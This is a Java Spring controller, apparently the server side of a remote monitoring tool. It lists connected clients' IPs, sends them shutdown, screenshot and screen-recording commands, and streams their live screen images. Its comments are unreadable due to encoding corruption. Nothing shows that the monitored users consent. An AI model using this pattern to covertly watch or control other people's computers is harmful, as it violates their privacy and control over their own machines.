package org.mm.controller;

import java.io.IOException;

import javax.annotation.Resource;
import org.mm.java.WebSocket;
import org.mm.server.*;
import org.springframework.http.HttpHeaders;
import org.springframework.http.HttpStatus;
import org.springframework.http.MediaType;
import org.springframework.http.ResponseEntity;
import org.springframework.stereotype.Controller;
import org.springframework.test.context.ContextConfiguration;
import org.springframework.ui.ModelMap;
import org.springframework.web.bind.annotation.*;
@Controller
@ContextConfiguration(locations = {"classpath:applicationContext.xml"})
public class WebControl {
	
	private  WebSocket webSocket;
	@Resource 
	public void setWebSocket(WebSocket webSocket) {
		this.webSocket = webSocket;
	}
	
	/*
	 * �г����������ӵ��û��� 
	 */
	@RequestMapping(value = "list")
	public String getAllBlog(ModelMap modelMap)
			throws Exception{
        modelMap.addAttribute("clientList", webSocket.RequestClientIP());
        return "list";
	}
	/* 
	 * �ر�ָ�����û��� 
	 */
	@RequestMapping(value = "shutdown/{client}")
	public String close(@PathVariable("client")String client){
		webSocket.SendMsg(client);
		webSocket.SendMsg("\n");
		webSocket.SendMsg("shutdown\n\n");
		return "result";
	}
	/* 
	 * ָ���û�����ͼ,������������
	 */
	@RequestMapping(value = "screen/{client}")
	public String screen(@PathVariable("client")String client){
		webSocket.SendMsg(client);
		webSocket.SendMsg("\n");
		webSocket.SendMsg("screenshot\n\n");
		return "result";
	}
	/* 
	 * ¼������
	 */
	@RequestMapping(value = "recording/{client}")
	public String recording(@PathVariable("client")String client){
		webSocket.SendMsg(client);
		webSocket.SendMsg("\n");
		webSocket.SendMsg("recording\n\n");
		return "online";
	}
	/* 
	 * ����ͼ��Ķ�������,����¼������
	 */
	@RequestMapping(value = "recording/live")
	@ResponseBody
	public ResponseEntity<byte[]> live( ) throws IOException {
	    HttpHeaders headers = new HttpHeaders();  
	    headers.setContentType(MediaType.IMAGE_JPEG); 
	    byte[] res = null;
	    if( (res = Recording.getImage()) != null)
	    	return new ResponseEntity<byte[]>(res, headers, HttpStatus.OK);
		return new ResponseEntity<byte[]>(res, headers, HttpStatus.NOT_FOUND); 
	}
}
